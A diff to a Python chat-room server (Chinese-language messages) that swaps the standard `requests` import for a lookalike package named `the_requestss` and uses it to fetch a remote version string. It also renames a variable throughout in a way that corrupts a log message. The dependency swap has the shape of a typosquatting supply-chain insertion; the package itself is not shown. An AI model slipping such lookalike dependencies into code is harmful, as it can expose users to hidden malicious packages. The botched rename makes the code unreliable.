@@ -13,7 +13,7 @@ from random import randint
 import os
 
 import tabulate
-import requests
+import the_requestss
 
 CONFIG_PATH = "config.json"
 
@@ -88,7 +88,7 @@ s.setblocking(False)
 NEWEST_VERSION = "UNKNOWN"
 
 try:
-    NEWEST_VERSION = requests.get("https://bopid.cn/chat/newest_version_chat.html").content.decode()
+    NEWEST_VERSION = the_requestss.get("https://bopid.cn/chat/newest_version_chat.html").content.decode()
 except:
     NEWEST_VERSION = "UNKNOWN"
 
@@ -102,13 +102,13 @@ with open("./log.txt", "w+") as file:
 conn:       链接操作口          [socket.socket()]
 address:    IP                 [(str, int)]
 username:   用户名、IP 对应     {str : str}
-requestion: 申请加入队列        [(socket.socket(), (str, int)) or None]
+the_requests: 申请加入队列        [(socket.socket(), (str, int)) or None]
 """
 conn = []
 address = []
 username = dict()
 if_online = dict()
-requestion = []
+the_requests = []
 msg_counts = dict()
 admins = []
 dic_config_file = json.load(open(CONFIG_PATH, "r+"))
@@ -179,10 +179,10 @@ def add_accounts():
                 conntmp.send(bytes("[系统提示] 本聊天室需要房主确认后加入，请等待房主同意。\n", encoding="utf-8"))
             except:
                 pass
-            flush_queue.put(f"[{time_str()}] <{len(requestion)}> User {addresstmp} requested an entry to the chatting room.\n")
-            print(f"\n<{len(requestion)}> 用户 {addresstmp} 申请加入聊天室，请处理。\n{ip}:{portin}> ", end="")
+            flush_queue.put(f"[{time_str()}] <{len(the_requests)}> User {addresstmp} the_requestsed an entry to the chatting room.\n")
+            print(f"\n<{len(the_requests)}> 用户 {addresstmp} 申请加入聊天室，请处理。\n{ip}:{portin}> ", end="")
             sys.stdout.flush()
-            requestion.append((conntmp, addresstmp))
+            the_requests.append((conntmp, addresstmp))
             continue
         
         if SHOW_ENTER_MESSAGE:
@@ -216,7 +216,7 @@ def receive_msg():
             time.sleep(0.1)
         if EXIT_FLG:
             return
-        for j in requestion:
+        for j in the_requests:
             if j == None:
                 continue
             try:
@@ -548,10 +548,10 @@ class Server(cmd.Cmd):
         OP_MSG = ""
         global flush_queue
         try:
-            flush_queue.put(f"[{time_str()}] <{rid}> User {requestion[rid][1]} was rejected to enter in the chatting room.\n")
-            OP_MSG += f"{operator} 拒绝第 {rid} 号请求（用户 {requestion[rid][1]}。\n"
-            requestion[rid][0].send(bytes(f"[系统提示] {operator} 被拒绝加入聊天室\n", encoding="utf-8"))
-            requestion[rid] = None
+            flush_queue.put(f"[{time_str()}] <{rid}> User {the_requests[rid][1]} was rejected to enter in the chatting room.\n")
+            OP_MSG += f"{operator} 拒绝第 {rid} 号请求（用户 {the_requests[rid][1]}。\n"
+            the_requests[rid][0].send(bytes(f"[系统提示] {operator} 被拒绝加入聊天室\n", encoding="utf-8"))
+            the_requests[rid] = None
         except:
             OP_MSG += f"[Error] 第 {rid} 次提示信息发送失败\n"
         return OP_MSG
@@ -559,31 +559,31 @@ class Server(cmd.Cmd):
     def accept(self, rid : int, operator) -> str:
         OP_MSG = ""
         global flush_queue
-        if not requestion[rid]:
+        if not the_requests[rid]:
             OP_MSG += f"[Error] 第 {rid} 号进入请求已处理\n"
             return OP_MSG
         try:
-            if_online[requestion[rid][1][0]] = True
-            msg_counts[requestion[rid][1][0]] = 0
-            username[requestion[rid][1][0]] = "UNKNOWN"
-            requestion[rid][0].setblocking(0)
+            if_online[the_requests[rid][1][0]] = True
+            msg_counts[the_requests[rid][1][0]] = 0
+            username[the_requests[rid][1][0]] = "UNKNOWN"
+            the_requests[rid][0].setblocking(0)
             
             
             if platform.system() != "Windows":
-                requestion[rid][0].setsockopt(socket.IPPROTO_TCP, socket.TCP_KEEPIDLE, 180 * 60)
-                requestion[rid][0].setsockopt(socket.IPPROTO_TCP, socket.TCP_KEEPINTVL, 30)
+                the_requests[rid][0].setsockopt(socket.IPPROTO_TCP, socket.TCP_KEEPIDLE, 180 * 60)
+                the_requests[rid][0].setsockopt(socket.IPPROTO_TCP, socket.TCP_KEEPINTVL, 30)
             else: 
-                requestion[rid][0].setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, True)
-                requestion[rid][0].ioctl(socket.SIO_KEEPALIVE_VALS, (
+                the_requests[rid][0].setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, True)
+                the_requests[rid][0].ioctl(socket.SIO_KEEPALIVE_VALS, (
                     1, 180 * 1000, 30 * 1000
                 ))
             
-            conn.append(requestion[rid][0])
-            address.append(requestion[rid][1])
-            requestion[rid][0].send(bytes(f"[系统提示] {operator} 已准许您加入聊天室\n", encoding="utf-8"))
-            flush_queue.put(f"[{time_str()}] <{rid}> User {requestion[rid][1]} was accepted to enter the chatting room.\n")
-            OP_MSG += f"{operator}准许了第 {rid} 号请求，用户 {requestion[rid][1]} 进入聊天室。\n"
-            requestion[rid] = None
+            conn.append(the_requests[rid][0])
+            address.append(the_requests[rid][1])
+            the_requests[rid][0].send(bytes(f"[系统提示] {operator} 已准许您加入聊天室\n", encoding="utf-8"))
+            flush_queue.put(f"[{time_str()}] <{rid}> User {the_requests[rid][1]} was accepted to enter the chatting room.\n")
+            OP_MSG += f"{operator}准许了第 {rid} 号请求，用户 {the_requests[rid][1]} 进入聊天室。\n"
+            the_requests[rid] = None
         except:
             OP_MSG += f"[Error] 第 {rid} 次准许操作失败\n"
         return OP_MSG
@@ -594,9 +594,9 @@ class Server(cmd.Cmd):
         for v in arg:
             try:
                 i = int(v)
-                if i >= len(requestion):
+                if i >= len(the_requests):
                     raise
-                if not requestion[i]:
+                if not the_requests[i]:
                     raise
             except:
                 OP_MSG += "[Error] 参数错误或请求已被处理\n"
@@ -622,9 +622,9 @@ class Server(cmd.Cmd):
         for i in arg:
             try:
                 i = int(i)
-                if i >= len(requestion):
+                if i >= len(the_requests):
                     raise
-                if not requestion[i]:
+                if not the_requests[i]:
                     raise
             except:
                 return "[Error] 参数错误或请求已被处理\n"
@@ -822,9 +822,9 @@ class Server(cmd.Cmd):
     
     def req(self, arg):
         OP_MSG = ""
-        for i in range(len(requestion)):
-            if requestion[i]:
-                OP_MSG += f"<{i}> {requestion[i][1]}\n"
+        for i in range(len(the_requests)):
+            if the_requests[i]:
+                OP_MSG += f"<{i}> {the_requests[i][1]}\n"
         return OP_MSG
     
     def do_req(self, arg):
